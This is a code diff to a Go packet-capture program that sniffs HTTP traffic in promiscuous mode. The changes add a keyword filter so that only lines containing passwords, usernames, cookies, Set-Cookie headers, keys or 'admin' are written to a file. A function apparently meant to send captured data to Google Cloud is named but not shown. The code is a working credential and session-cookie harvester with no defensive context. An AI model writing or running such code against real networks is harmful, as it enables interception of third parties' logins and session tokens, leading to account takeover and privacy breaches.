@@ -38,6 +38,7 @@ func sendToGCP(filename string) {
 
 func Capture (Dev string) {
 	flag := 0
+	keywords := []string{"admin","Admin","Set-Cookie","cookie","Cookie","user","User","Pass","pass","password","passwd","Password","Passwd","key","Key","username","Username"}
 	// Open interface
 	if handle, err := pcap.OpenLive(Dev, 1600, true, 0); err != nil {
 		panic(err)
@@ -45,7 +46,7 @@ func Capture (Dev string) {
 		packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
 		//count := 0
 
-		filename := "toRead"
+		filename := "toRead.txt"
 		//filename := "packets"+strconv.Itoa(count)+".pcap"
 		file, err := os.OpenFile(filename, os.O_CREATE | os.O_APPEND | os.O_WRONLY, 0660)
 
@@ -127,9 +128,31 @@ func Capture (Dev string) {
 			}
 */
 			if srcPort[1] == "80(http)" || dstPort[1] == "80(http)" {
+				payload := string(packet.ApplicationLayer().Payload())
+				outputToFile := ""
 				fmt.Println("srcIP:",srcIP[1],"\ndstIP:",dstIP[1],"\nsrcPort:",srcPort[1],"\ndstPort:",dstPort[1])
-				fmt.Println("\n",string(packet.ApplicationLayer().Payload()),"\n")
-				line := srcIP[1]+"~"+dstIP[1]+"~"+srcPort[1]+"~"+dstPort[1]+"~"+string(packet.ApplicationLayer().Payload())+"\n"
+				fmt.Println("\n",payload,"\n")
+
+				payloadArr := strings.Split(payload,"\n")
+
+				for _,v1 := range payloadArr {
+					for _,v2 := range keywords {
+						if strings.Contains(v1,v2) {
+							outputToFile = v1+"\n"
+						}
+					}
+				}
+
+				if outputToFile == "" {
+					for i,v := range payloadArr {
+						if v == "\n" {
+							break
+						}
+						outputToFile += payloadArr[i]
+					}
+				}
+
+				line := srcIP[1]+"~"+dstIP[1]+"~"+srcPort[1]+"~"+dstPort[1]+"~"+outputToFile+"\n"
 				_, err := file.WriteString(line)
 				if err != nil {
 					fmt.Println(err)
